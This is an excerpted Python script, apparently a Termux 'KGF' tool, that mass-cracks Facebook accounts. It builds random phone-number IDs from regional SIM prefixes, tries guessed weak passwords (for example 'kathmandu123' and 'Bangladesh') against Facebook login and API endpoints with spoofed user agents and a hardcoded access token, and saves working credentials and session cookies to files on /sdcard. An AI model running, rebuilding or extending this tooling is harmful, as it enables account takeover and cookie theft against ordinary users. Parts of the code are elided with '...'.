...
htl='html'
ens='?m=1'
apvlink=f'{hts}{dots}{sls}{sls}{KGFs}{hihs}pro{dts}{blg}{pos}{dts}{dmns}{sls}{yrs}{sls}{srls}{sls}{nms}{dts}{htl}{ens}'
def rqst():
...
def KGF():
	...
	print(f'   {B}|{G}02{B}|{W} Random Cloning ({W}PRO{P}){B} ')
	print(f'   {B}|{G}03{B}|{W} Random Cloning ({W}API{P}){B}]')
	print(f'   {B}|{G}04{B}|{W} Gmail Cloning ')
	print(f'   {B}|{G}05{B}|{W} Random Cloning Nepal')
	lin()
	...
	if tan in ['1','01']:
		...
		print(f'   {B}|{G}🗿{B}|{W} Choice Correctly ');time.sleep(2);KGF()
def gmlx():
	user=[]
	clr()
	lin()
	print(f'   {B}|{G}🗿{B}|{W} FAST NAME EXAMPLE {R}:{B}')
	lin()
	kode = input(f'   {B}|{G}🗿{B}|{W} FAST NAME {R}:{B} ')
	lin()
	print(f'   {B}|{G}🗿{B}|{W} LAST NAME EXAMPLE {R}:{B} ')
	lin()
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f'   {B}|{G}🗿{B}|{W} ID Saved id {R}:{G} KGF Folder')
		lin()
		for guru in user:
...
def filex():
	...
	if me in ["1", "01","11","A","a"]:
		...
		try:
			...
			ps_limit =1
		lin();print(f'   {B}|{G}🗿{B}|{W} PASS Example {R}:{G} first last, first123, first@@@');lin()
		for i in range(ps_limit):
			plist.append(input(f'   {B}|{G}🗿{B}|{W} Put password {i+1} {R}:{G} '))
		lin();print(f'   {B}|{G}🗿{B}|{W} Show cp account{P}? {W}({G}y{W}/{R}n{W}){R}:{G} ');lin()
		cx=input(f'   {B}|{G}🗿{B}|{W} Choose {R}:{G} ')
		...
		with ThreadPool(max_workers=30) as crack_submit:
			...
			print(f'   {B}|{G}🗿{B}|{W} Total Ids {R}:{G} {total_ids}')
			print(f'   {B}|{G}🗿{B}|{W} Ids Saved id {R}:{G} KGF Folder')
			lin()
			for user in fo:
...
def rndmx():
	...
	clr()
	lin()
	print(f'   {B}|{G}🗿{B}|{W} SIM CODE EXAMPLE : 9861,9868,9848')
	lin()
	kode = input(f'   {B}|{G}🗿{B}|{W} SIM CODE : ')
	clr()
	lin()
	...
	clr()
	lin()
	print(f'   {B}|{G}01{B}|{W} Fast Cracking ')
	print(f'   {B}|{G}02{B}|{W} Slow Cracking ')
	lin()
	spcr = input(f'   {B}|{G}🗿{B}|{W} Choice {P}:{G} ')
	#limit=int(input(f'   {B}|{G}🗿{B}|{W} Cracking Limite {R}:{G} '))
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		lin()
		print(f'   {B}|{G}🗿{B}|{W} Total Ids   {R}:{G} {tl}')
		print(f'   {B}|{G}🗿{B}|{W} Sim code    {R}:{G} {kode}')
		print(f'   {B}|{G}🗿{B}|{W} ID Saved id {R}:{G} KGF Folder')
		lin()
		for guru in user:
			uid = '+98'+kode+guru
			if spcr in ['1','01']:
				...
				pwx = ['57273200','59039200','57575751',kode+guru,guru,kode[2:]+guru,kode+guru[:2],kode+guru[:4]]
			if mthod in ['1','01']:
				yaari.submit(rcrack1,uid,pwx,tl)
			if mthod in ['2','02']:
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			if spcr in ['1','01']:
				...
				pwx = [guru,kode+kodex+guru,kodex+guru,'@#@#@#','@@@###','123890','@#৳%&*','১২৩৪৫৬','Bangladesh','BANGLADESH','bangladesh','Aaa111','111000',kode+kode]
			if mthod in ['1','01']:
				yaari.submit(rcrack1,uid,pwx,tl)
			if mthod in ['2','02']:
				yaari.submit(rcrack2,uid,pwx,tl)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r   {B}|{G}M1{B}|{W}[{G}KGF-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if uid in oks:
                    ...
                    print(f"\r{G}   [KGF-OK] {W}{cid}|{ps}")
                    print(f"\r{G}   [KGF-COOKIE] {W}{coki}")
                    open('/sdcard/KGF-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                    oks.append(uid)
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = uid
                #print(f"\r{R}   [KGF-CP] {cid}|{ps}")
                open('/sdcard/KGF-CP.txt', 'a').write( cid+'|'+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def rcrack2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            session = requests.Session()
            sys.stdout.write(f'\r   {B}|{G}M2{B}|{W}[{G}KGF-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m   [KGF-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m   [KGF-OK] %s | %s'%(ids,pas))
                                print(f"\r{G}   [KGF-COOKIE] {W}{kuki}")
                                open('/sdcard/KGF-FILE-OK.txt', 'a').write( ids+'|'+ps+'|'+coki+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m   [KGF-CP] '+ids+'|'+pas+'\033[1;97m')
                                        open(f'/sdcard/KGF-FILE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def rndmpi():
		...
		clr()
		lin()
		print(f'   {B}|{G}🗿{B}|{W} SIM CODE EXAMPLE : 9817, 8864, 8665')
		code = input(f'   {B}|{G}🗿{B}|{W} SIM CODE :{G} ')
		clr()
		lin()
		try:
			print(f' {B}|{G}🗿{B}|{W} Example :{G} 1000, 5000, 10000, 99999')
			lin()
			limit = int(input(f' {B}|{G}🗿{B}|{W} Cracking Limite :{G} '))
		except ValueError:
			limit = 50000
		clr()
		lin()
		print(f'   {B}|{G}01{B}|{W} Method {G}API-1')
		print(f'   {B}|{G}02{B}|{W} Method {G}API-2')
		print(f'   {B}|{G}03{B}|{W} Method {G}API-X')
		mthd = input(f'   {B}|{G}🗿{B}|{W} Choice {P}:{G} ')
		clr()
		lin()
		print(f'   {B}|{G}01{B}|{W} Fast Speed Cracking ')
		print(f'   {B}|{G}02{B}|{W} Medium Speed Cracking')
		print(f'   {B}|{G}03{B}|{W} Slow Speed Cracking ')
		lin()
		plst = input(f'   {B}|{G}🗿{B}|{W} Choice {P}:{G} ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with ThreadPool(max_workers=30) as SPYC:	
			clr()
			tl = str(len(user))
			lin()
			print(f'   {B}|{G}🗿{B}|{W} Total Ids   {R}:{G} {tl}')
			print(f'   {B}|{G}🗿{B}|{W} Sim code    {R}:{G} {code}')
			print(f'   {B}|{G}🗿{B}|{W} ID Saved in {R}:{G} KGF FILEs')
			lin()
			for psx in user:
				ids = '+91'+code+psx
				if plst in ['1','01']:
					passlist = [code+psx,'9868']
				elif plst in ['2','02']:
					passlist = [code+psx,psx,'kathmandu','pokhara123','tamang123','kathmandu123','nepal1234']
				else:
					passlist = [code+psx,psx,'kathmandu','pokhara123','tamang123','kathmandu123','nepal1234','nepal@123',code[2:]+psx,code+psx[:2],code+psx[:4]]
				if mthd in ['1','01']:
					SPYC.submit(rnapi1,ids,passlist)
				elif mthd in ['2','02']:
					SPYC.submit(rndm1,ids,passlist,tl)
				elif mthd in ['3','03']:
					SPYC.submit(rndmx,ids,passlist)
				else:
					SPYC.submit(rnapi1,ids,passlist)
KGFapi=[]
...
for okdk in range(5000):
    ...
    KGFapi.append(ua)
def rnapi1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m   [KGF API] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [KGF-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/KGF-API-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/KGF-UA.txt','a').write(ua+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[38;5;205m [KGF-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KGF-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                pass
def rndm1(ids, passlist, tl):
    try:
        global oks, twf, loop
        sys.stdout.write(f"\r\033[1;97m   [KGF API-2] \033[1;97m%s\033[1;97m|\033[1;92mOK:-%s\033[1;97m" % (loop, len(oks)))
        sys.stdout.flush()
        ...
        for ps in passlist:
            ...
            if 'session_key' in q:
                if "yes" in scoki:
                    ...
                    cokis = f"sb={cok};{coki}"
                    print('\r\033[1;92m [KGF-OK] ' + udx + ' | ' + ps + '\n\033[0;97m')
                    print('\r\033[1;92m [COOKIE-ID] \033[1;97m ' + cokis + '\n\033[1;97m')
                    open('/sdcard/KGF-OK.txt', 'a').write(udx + '|' + ps + '|' + cokis + '\n')
                    oks.append(ids)
                else:
                    udx = str(q['uid'])
                    print('\r\033[1;92m [KGF-OK] ' + udx + ' | ' + ps + '\033[0;97m')
                    open('/sdcard/KGF-OK.txt', 'a').write(udx + '|' + ps + '\n')
                    oks.append(ids)
            else:
                continue
...
def rndmx(ids,passlist):
        global loop,ok
        sys.stdout.write('\r\r\033[1;37m   [KGF API-X] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        ...
                        if 'session_key' in po:
                                ...
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r{G}   {G}[KGF-OK] {str(uid)} | {pas} ')
                                print(f'   {G}[Cookie]{W} {coki}')
                                open('/sdcard/KGF-API-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                try:
                                    ...
                                    uid = ids
                                print(f'\r{R}   [KGF-CP] {str(uid)} | {pas} ')
                                open('/sdcard/KGF-API-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
